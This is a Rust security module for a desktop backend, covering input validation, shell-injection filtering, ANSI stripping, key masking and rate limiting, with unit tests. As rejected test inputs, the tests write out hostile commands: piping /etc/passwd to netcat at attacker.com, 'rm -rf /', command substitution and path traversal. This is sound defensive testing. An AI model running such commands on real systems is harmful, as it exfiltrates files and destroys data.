//! # security
//!
//! Input validation, sanitisation, rate limiting, and security hardening for
//! the CodeOrchestra Rust backend (DAW-549).
//!
//! ## Responsibilities
//! - Validate and sanitise all data arriving via the IPC WebSocket layer
//! - Reject shell-injection characters in PTY/CLI payloads
//! - Strip malicious ANSI escape sequences from PTY output
//! - Per-connection rate limiting (sliding window)
//! - Enforce session-ID format (UUID v4 only) to prevent path traversal
//! - Validate URLs before opening them externally (`openExternal`)
//! - Provide allow-listed environment variable injection for PTY sessions
//! - Mask sensitive values (API keys) in logs and audit trails
//! - Centralise constants for max payload sizes, allowed schemes, timeouts, etc.

use std::collections::HashMap;
use std::sync::Mutex;
use std::time::{Duration, Instant};

use regex::Regex;
use thiserror::Error;
use tracing::warn;

// ---------------------------------------------------------------------------
// Constants
// ---------------------------------------------------------------------------

/// Maximum allowed length of a PTY data payload in bytes.
pub const MAX_PTY_WRITE_BYTES: usize = 64 * 1024; // 64 KiB

/// Maximum length of a notification title or body.
pub const MAX_NOTIFICATION_LEN: usize = 512;

/// Maximum length of a single CLI argument string.
pub const MAX_ARG_LEN: usize = 4096;

/// URL schemes that are permitted by `openExternal`.
pub const ALLOWED_URL_SCHEMES: &[&str] = &["https", "http", "mailto"];

/// Default timeout (in seconds) for external commands (Claude CLI, etc.).
pub const DEFAULT_COMMAND_TIMEOUT_SECS: u64 = 30;

/// Maximum number of requests per `RATE_LIMIT_WINDOW` per connection.
pub const RATE_LIMIT_MAX_REQUESTS: usize = 100;

/// Sliding-window duration for rate limiting.
pub const RATE_LIMIT_WINDOW: Duration = Duration::from_secs(60);

// ---------------------------------------------------------------------------
// Errors
// ---------------------------------------------------------------------------

/// Errors produced by the security validation layer.
#[derive(Debug, Error)]
pub enum SecurityError {
    #[error("invalid session ID format: {0}")]
    InvalidSessionId(String),

    #[error("payload too large: {size} bytes (max {max})")]
    PayloadTooLarge { size: usize, max: usize },

    #[error("disallowed URL scheme: {0}")]
    DisallowedUrlScheme(String),

    #[error("invalid URL: {0}")]
    InvalidUrl(String),

    #[error("disallowed environment variable: {0}")]
    DisallowedEnvVar(String),

    #[error("invalid path: {0}")]
    InvalidPath(String),

    #[error("shell injection detected in input: {0}")]
    ShellInjection(String),

    #[error("rate limit exceeded for connection: {0}")]
    RateLimitExceeded(String),
}

// ---------------------------------------------------------------------------
// Validators — session / payload / URL / path
// ---------------------------------------------------------------------------

/// Validate that a session ID is a well-formed UUID v4 string.
///
/// Accepting arbitrary strings as session IDs could allow path traversal or
/// log injection attacks.  Only the shape `8-4-4-4-12` hex is enforced.
pub fn validate_session_id(id: &str) -> Result<(), SecurityError> {
    let re_ok = id.len() == 36
        && id.chars().enumerate().all(|(i, c)| match i {
            8 | 13 | 18 | 23 => c == '-',
            _ => c.is_ascii_hexdigit(),
        });
    if re_ok {
        Ok(())
    } else {
        Err(SecurityError::InvalidSessionId(id.to_owned()))
    }
}

/// Validate the size of a PTY write payload.
pub fn validate_pty_payload(data: &[u8]) -> Result<(), SecurityError> {
    if data.len() > MAX_PTY_WRITE_BYTES {
        Err(SecurityError::PayloadTooLarge {
            size: data.len(),
            max: MAX_PTY_WRITE_BYTES,
        })
    } else {
        Ok(())
    }
}

/// Validate a URL for use with `openExternal`.
pub fn validate_external_url(url: &str) -> Result<(), SecurityError> {
    let scheme = url
        .split("://")
        .next()
        .ok_or_else(|| SecurityError::InvalidUrl(url.to_owned()))?;

    if ALLOWED_URL_SCHEMES.contains(&scheme) {
        Ok(())
    } else {
        Err(SecurityError::DisallowedUrlScheme(scheme.to_owned()))
    }
}

/// Validate a working-directory path for PTY sessions.
///
/// Rejects paths containing `..` components to prevent directory traversal.
pub fn validate_cwd(path: &str) -> Result<(), SecurityError> {
    if path.contains("..") {
        Err(SecurityError::InvalidPath(path.to_owned()))
    } else {
        Ok(())
    }
}

/// Returns `true` if the given environment variable name is on the allow-list.
///
/// Only whitelisted variables may be injected into PTY sessions to prevent
/// credential leakage or privilege escalation.
pub fn is_allowed_env_var(name: &str) -> bool {
    const ALLOWED: &[&str] = &[
        "MINIMAX_API_KEY",
        "PATH",
        "HOME",
        "LANG",
        "TERM",
        "COLORTERM",
        "ANTHROPIC_API_KEY",
    ];
    ALLOWED.contains(&name)
}

// ---------------------------------------------------------------------------
// Command / argument validation — shell injection prevention
// ---------------------------------------------------------------------------

/// Characters that must not appear in a PTY command or CLI argument.
///
/// These are the standard shell metacharacters that could be used for command
/// injection if the value is later interpolated into a shell command string.
const SHELL_DANGEROUS_CHARS: &[char] =
    &[';', '|', '&', '$', '`', '(', ')', '{', '}', '\n', '\r', '<', '>'];

/// Validate a raw command string for shell injection characters.
///
/// Use this before passing any user-supplied string to a shell or PTY.
pub fn validate_command(cmd: &str) -> Result<(), SecurityError> {
    if cmd.chars().any(|c| SHELL_DANGEROUS_CHARS.contains(&c)) {
        warn!(cmd = %mask_sensitive_value(cmd), "Shell injection attempt detected");
        Err(SecurityError::ShellInjection(cmd.to_owned()))
    } else {
        Ok(())
    }
}

/// Validate a single CLI argument (e.g. an element of `ClaudeCliPayload::args`).
///
/// Rejects shell injection characters and enforces a maximum length.
pub fn validate_cli_arg(arg: &str) -> Result<(), SecurityError> {
    if arg.len() > MAX_ARG_LEN {
        return Err(SecurityError::PayloadTooLarge {
            size: arg.len(),
            max: MAX_ARG_LEN,
        });
    }
    validate_command(arg)
}

// ---------------------------------------------------------------------------
// PTY output sanitisation — strip malicious ANSI escape sequences
// ---------------------------------------------------------------------------

/// Strip ANSI / VT escape sequences from PTY output before forwarding to the
/// renderer or writing to logs.
///
/// Handles:
/// - CSI sequences: `ESC [ … final`  (colours, cursor movement, etc.)
/// - OSC sequences: `ESC ] … ST`     (terminal title, hyperlinks)
/// - Other two-character `ESC X` sequences
///
/// Normal printable characters (including newlines and tabs) are preserved.
pub fn sanitize_pty_output(output: &str) -> String {
    // Match CSI: ESC [ <param bytes> <intermediate bytes> <final byte>
    // Match OSC: ESC ] … BEL  or  ESC ] … ESC \
    // Match other two-char ESC sequences: ESC <anything except [ or ]>
    let re = Regex::new(
        r"(?x)
        \x1b\[[\x20-\x3f]*[\x40-\x7e]   # CSI sequence
        |
        \x1b\][^\x07\x1b]*(?:\x07|\x1b\\) # OSC sequence (terminated by BEL or ST)
        |
        \x1b[^\[\]]                        # other 2-char ESC sequences
        ",
    )
    .expect("static regex is valid");

    re.replace_all(output, "").into_owned()
}

// ---------------------------------------------------------------------------
// Sensitive value masking
// ---------------------------------------------------------------------------

/// Mask the middle portion of a sensitive string for safe logging.
///
/// Reveals the first 4 and last 4 characters; replaces the rest with `*`.
/// If the value is shorter than 8 characters the entire string is masked.
///
/// ```
/// # use security::mask_sensitive_value;
/// assert_eq!(mask_sensitive_value("sk-ant-secret123"), "sk-a********t123");
/// assert_eq!(mask_sensitive_value("short"), "****");
/// ```
pub fn mask_sensitive_value(value: &str) -> String {
    if value.len() <= 8 {
        return "*".repeat(4);
    }
    let (prefix, rest) = value.split_at(4);
    let (middle, suffix) = rest.split_at(rest.len() - 4);
    format!("{}{}{}", prefix, "*".repeat(middle.len()), suffix)
}

// ---------------------------------------------------------------------------
// Rate limiter (sliding window, per connection)
// ---------------------------------------------------------------------------

/// Per-connection sliding-window rate limiter.
///
/// Tracks request timestamps for each connection ID and rejects requests that
/// exceed [`RATE_LIMIT_MAX_REQUESTS`] within a [`RATE_LIMIT_WINDOW`].
///
/// # Thread safety
///
/// Internally protected by a [`Mutex`]; safe to share via `Arc<RateLimiter>`.
pub struct RateLimiter {
    /// Map of connection ID → list of request timestamps within the window.
    records: Mutex<HashMap<String, Vec<Instant>>>,
    max_requests: usize,
    window: Duration,
}

impl RateLimiter {
    /// Create a new rate limiter with the default limits.
    pub fn new() -> Self {
        Self {
            records: Mutex::new(HashMap::new()),
            max_requests: RATE_LIMIT_MAX_REQUESTS,
            window: RATE_LIMIT_WINDOW,
        }
    }

    /// Create a rate limiter with custom limits (useful for tests).
    pub fn with_limits(max_requests: usize, window: Duration) -> Self {
        Self {
            records: Mutex::new(HashMap::new()),
            max_requests,
            window,
        }
    }

    /// Record a request for `connection_id` and return `Ok(())` if it is
    /// within the rate limit, or [`SecurityError::RateLimitExceeded`] if not.
    pub fn check(&self, connection_id: &str) -> Result<(), SecurityError> {
        let mut records = self.records.lock().expect("rate limiter mutex poisoned");
        let now = Instant::now();
        let window = self.window;

        let timestamps = records.entry(connection_id.to_owned()).or_default();

        // Evict timestamps that have fallen outside the window.
        timestamps.retain(|&t| now.duration_since(t) < window);

        if timestamps.len() >= self.max_requests {
            warn!(
                connection_id = %connection_id,
                count = timestamps.len(),
                max = self.max_requests,
                "Rate limit exceeded"
            );
            return Err(SecurityError::RateLimitExceeded(connection_id.to_owned()));
        }

        timestamps.push(now);
        Ok(())
    }

    /// Remove all tracking data for a connection (call on disconnect).
    pub fn remove_connection(&self, connection_id: &str) {
        let mut records = self.records.lock().expect("rate limiter mutex poisoned");
        records.remove(connection_id);
    }
}

impl Default for RateLimiter {
    fn default() -> Self {
        Self::new()
    }
}

// ---------------------------------------------------------------------------
// Security audit logging
// ---------------------------------------------------------------------------

/// Severity levels for security audit events.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum AuditSeverity {
    /// Informational — normal operations worth recording.
    Info,
    /// Warning — suspicious but not necessarily malicious.
    Warn,
    /// Critical — clear security violation (injection, rate limit, etc.).
    Critical,
}

/// Emit a structured security audit log entry via `tracing`.
///
/// In production these entries should be routed to a separate audit sink
/// (append-only file, SIEM, etc.).  For now they go to the standard tracing
/// subscriber so they appear in the console during development.
pub fn audit_log(severity: AuditSeverity, event: &str, detail: &str) {
    match severity {
        AuditSeverity::Info => {
            tracing::info!(target: "security_audit", event = %event, detail = %detail);
        }
        AuditSeverity::Warn => {
            tracing::warn!(target: "security_audit", event = %event, detail = %detail);
        }
        AuditSeverity::Critical => {
            tracing::error!(target: "security_audit", event = %event, detail = %detail);
        }
    }
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;
    use std::thread;

    // --- Session ID -----------------------------------------------------------

    #[test]
    fn valid_uuid_accepted() {
        assert!(validate_session_id("550e8400-e29b-41d4-a716-446655440000").is_ok());
    }

    #[test]
    fn invalid_uuid_rejected() {
        assert!(validate_session_id("../../etc/passwd").is_err());
        assert!(validate_session_id("short").is_err());
        assert!(validate_session_id("").is_err());
    }

    #[test]
    fn valid_uuid_v4_format_accepted() {
        assert!(validate_session_id("f47ac10b-58cc-4372-a567-0e02b2c3d479").is_ok());
    }

    #[test]
    fn uuid_wrong_length_rejected() {
        assert!(validate_session_id("550e8400-e29b-41d4-a716-44665544000").is_err());
    }

    #[test]
    fn uuid_with_invalid_chars_rejected() {
        assert!(validate_session_id("550e8400-e29b-41d4-a716-44665544000z").is_err());
    }

    // --- PTY payload ----------------------------------------------------------

    #[test]
    fn pty_payload_size_ok() {
        let data = vec![b'a'; 1024];
        assert!(validate_pty_payload(&data).is_ok());
    }

    #[test]
    fn pty_payload_too_large() {
        let data = vec![b'a'; MAX_PTY_WRITE_BYTES + 1];
        assert!(validate_pty_payload(&data).is_err());
    }

    #[test]
    fn payload_exactly_at_limit_is_ok() {
        let data = vec![b'x'; MAX_PTY_WRITE_BYTES];
        assert!(validate_pty_payload(&data).is_ok());
    }

    #[test]
    fn payload_one_byte_over_limit_is_err() {
        let data = vec![b'x'; MAX_PTY_WRITE_BYTES + 1];
        let err = validate_pty_payload(&data).unwrap_err();
        assert!(matches!(
            err,
            SecurityError::PayloadTooLarge { size, max }
            if size == MAX_PTY_WRITE_BYTES + 1 && max == MAX_PTY_WRITE_BYTES
        ));
    }

    #[test]
    fn empty_payload_is_ok() {
        assert!(validate_pty_payload(&[]).is_ok());
    }

    // --- URL ------------------------------------------------------------------

    #[test]
    fn https_url_allowed() {
        assert!(validate_external_url("https://example.com").is_ok());
    }

    #[test]
    fn http_url_allowed() {
        assert!(validate_external_url("http://example.com").is_ok());
    }

    #[test]
    fn mailto_url_allowed() {
        assert!(validate_external_url("mailto://user@example.com").is_ok());
    }

    #[test]
    fn file_url_rejected() {
        assert!(validate_external_url("file:///etc/passwd").is_err());
    }

    #[test]
    fn javascript_url_rejected() {
        assert!(validate_external_url("javascript:alert(1)").is_err());
    }

    #[test]
    fn ftp_url_rejected() {
        assert!(validate_external_url("ftp://files.example.com").is_err());
    }

    #[test]
    fn url_without_scheme_separator_rejected() {
        assert!(validate_external_url("example.com").is_err());
    }

    // --- CWD ------------------------------------------------------------------

    #[test]
    fn traversal_path_rejected() {
        assert!(validate_cwd("/home/user/../../../etc").is_err());
    }

    #[test]
    fn normal_path_accepted() {
        assert!(validate_cwd("/home/user/projects").is_ok());
    }

    #[test]
    fn traversal_with_windows_style_rejected() {
        assert!(validate_cwd("C:\\Users\\..\\etc").is_err());
    }

    #[test]
    fn relative_cwd_without_traversal_accepted() {
        assert!(validate_cwd("src/main.rs").is_ok());
    }

    // --- Env vars -------------------------------------------------------------

    #[test]
    fn allowed_env_vars() {
        assert!(is_allowed_env_var("MINIMAX_API_KEY"));
        assert!(is_allowed_env_var("PATH"));
        assert!(!is_allowed_env_var("SECRET_TOKEN"));
        assert!(!is_allowed_env_var("AWS_SECRET_ACCESS_KEY"));
    }

    #[test]
    fn anthropic_api_key_is_allowed() {
        assert!(is_allowed_env_var("ANTHROPIC_API_KEY"));
    }

    #[test]
    fn term_env_var_is_allowed() {
        assert!(is_allowed_env_var("TERM"));
        assert!(is_allowed_env_var("COLORTERM"));
    }

    #[test]
    fn empty_env_var_name_rejected() {
        assert!(!is_allowed_env_var(""));
    }

    // --- Command / shell injection --------------------------------------------

    #[test]
    fn clean_command_accepted() {
        assert!(validate_command("echo hello").is_ok());
        assert!(validate_command("ls -la /tmp").is_ok());
        assert!(validate_command("cargo test").is_ok());
    }

    #[test]
    fn semicolon_injection_rejected() {
        assert!(validate_command("echo hi; rm -rf /").is_err());
    }

    #[test]
    fn pipe_injection_rejected() {
        assert!(validate_command("cat /etc/passwd | nc attacker.com 80").is_err());
    }

    #[test]
    fn ampersand_injection_rejected() {
        assert!(validate_command("sleep 100 &").is_err());
    }

    #[test]
    fn dollar_substitution_rejected() {
        assert!(validate_command("echo $HOME").is_err());
    }

    #[test]
    fn backtick_substitution_rejected() {
        assert!(validate_command("echo `id`").is_err());
    }

    #[test]
    fn newline_injection_rejected() {
        assert!(validate_command("echo ok\nrm -rf /").is_err());
    }

    #[test]
    fn redirect_injection_rejected() {
        assert!(validate_command("cat /etc/passwd > /tmp/out").is_err());
    }

    #[test]
    fn cli_arg_too_long_rejected() {
        let long = "a".repeat(MAX_ARG_LEN + 1);
        assert!(validate_cli_arg(&long).is_err());
    }

    #[test]
    fn cli_arg_valid_accepted() {
        assert!(validate_cli_arg("--model").is_ok());
        assert!(validate_cli_arg("claude-opus-4-5-20251001").is_ok());
    }

    // --- PTY output sanitisation ---------------------------------------------

    #[test]
    fn plain_text_unchanged() {
        let s = "Hello, world!\nSecond line.";
        assert_eq!(sanitize_pty_output(s), s);
    }

    #[test]
    fn csi_color_codes_stripped() {
        // Bold red text reset
        let input = "\x1b[1;31mERROR\x1b[0m: something failed";
        let output = sanitize_pty_output(input);
        assert_eq!(output, "ERROR: something failed");
    }

    #[test]
    fn cursor_movement_stripped() {
        // ESC[2J (erase display) + ESC[H (cursor home)
        let input = "\x1b[2J\x1b[Hclean";
        let output = sanitize_pty_output(input);
        assert_eq!(output, "clean");
    }

    #[test]
    fn osc_title_sequence_stripped() {
        // Terminal title set: ESC ] 0 ; title BEL
        let input = "\x1b]0;My Terminal\x07Hello";
        let output = sanitize_pty_output(input);
        assert_eq!(output, "Hello");
    }

    #[test]
    fn mixed_output_sanitized() {
        let input = "\x1b[32mOK\x1b[0m normal text \x1b[31mERROR\x1b[0m";
        let output = sanitize_pty_output(input);
        assert_eq!(output, "OK normal text ERROR");
    }

    // --- Sensitive value masking ---------------------------------------------

    #[test]
    fn long_api_key_masked() {
        let key = "sk-ant-secret123";
        let masked = mask_sensitive_value(key);
        assert!(masked.starts_with("sk-a"));
        assert!(masked.ends_with("t123"));
        assert!(masked.contains("****"));
        assert!(!masked.contains("secret"));
    }

    #[test]
    fn short_value_fully_masked() {
        assert_eq!(mask_sensitive_value("short"), "****");
        assert_eq!(mask_sensitive_value(""), "****");
        assert_eq!(mask_sensitive_value("12345678"), "****");
    }

    #[test]
    fn value_just_over_eight_chars_masked() {
        // 9 chars: "123456789" → "1234" + "*" + "6789"
        let masked = mask_sensitive_value("123456789");
        assert_eq!(masked, "1234*6789");
    }

    // --- Rate limiter ---------------------------------------------------------

    #[test]
    fn within_rate_limit_ok() {
        let limiter = RateLimiter::with_limits(5, Duration::from_secs(60));
        for _ in 0..5 {
            assert!(limiter.check("conn-1").is_ok());
        }
    }

    #[test]
    fn exceeding_rate_limit_rejected() {
        let limiter = RateLimiter::with_limits(3, Duration::from_secs(60));
        for _ in 0..3 {
            limiter.check("conn-2").unwrap();
        }
        let err = limiter.check("conn-2").unwrap_err();
        assert!(matches!(err, SecurityError::RateLimitExceeded(_)));
    }

    #[test]
    fn different_connections_isolated() {
        let limiter = RateLimiter::with_limits(2, Duration::from_secs(60));
        limiter.check("conn-a").unwrap();
        limiter.check("conn-a").unwrap();
        // conn-a is now at limit; conn-b should still be fine
        assert!(limiter.check("conn-a").is_err());
        assert!(limiter.check("conn-b").is_ok());
    }

    #[test]
    fn window_expiry_allows_new_requests() {
        let limiter = RateLimiter::with_limits(2, Duration::from_millis(50));
        limiter.check("conn-c").unwrap();
        limiter.check("conn-c").unwrap();
        assert!(limiter.check("conn-c").is_err());

        thread::sleep(Duration::from_millis(60));

        // Window has expired — should be allowed again.
        assert!(limiter.check("conn-c").is_ok());
    }

    #[test]
    fn remove_connection_clears_state() {
        let limiter = RateLimiter::with_limits(1, Duration::from_secs(60));
        limiter.check("conn-d").unwrap();
        assert!(limiter.check("conn-d").is_err());

        limiter.remove_connection("conn-d");
        // After removal, the connection starts fresh.
        assert!(limiter.check("conn-d").is_ok());
    }

    // --- Audit logging (smoke test — just ensure it doesn't panic) ------------

    #[test]
    fn audit_log_does_not_panic() {
        audit_log(AuditSeverity::Info, "session_started", "session=test-123");
        audit_log(
            AuditSeverity::Warn,
            "suspicious_input",
            "detail=contains semicolon",
        );
        audit_log(
            AuditSeverity::Critical,
            "injection_attempt",
            "cmd=rm -rf /",
        );
    }
}
